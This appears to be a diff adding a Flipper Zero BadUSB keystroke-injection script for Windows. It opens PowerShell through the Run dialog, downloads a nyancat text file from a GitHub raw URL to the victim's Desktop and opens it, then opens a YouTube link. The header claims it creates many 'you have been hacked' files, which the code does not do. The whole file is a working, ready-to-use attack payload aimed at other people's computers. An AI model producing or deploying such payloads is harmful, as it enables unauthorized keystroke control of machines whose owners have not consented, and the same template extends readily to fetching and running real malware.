@@ -1,0 +1,18 @@
+REM Author: SeenKid (seenkid#1337 on Discord)
+REM Description: Creates a lot of files with the text you have been hacked on desktop.
+REM Version:	1.0
+DELAY 700
+GUI r
+DELAY 700
+STRING powershell
+ENTER
+DELAY 700
+STRING $DesktopPath = [Environment]::GetFolderPath("Desktop"); Invoke-WebRequest -Uri https://raw.githubusercontent.com/SeenKid/flipper-zero-bad-usb/main/utils/files/nyancat.txt -OutFile $DesktopPath/nyan.txt; Start-Process -FilePath "$DesktopPath/nyan.txt" 
+DELAY 600
+ENTER
+DELAY 1000
+GUI r
+DELAY 600
+STRING https://youtu.be/QH2-TGUlwu4
+DELAY 600
+ENTER
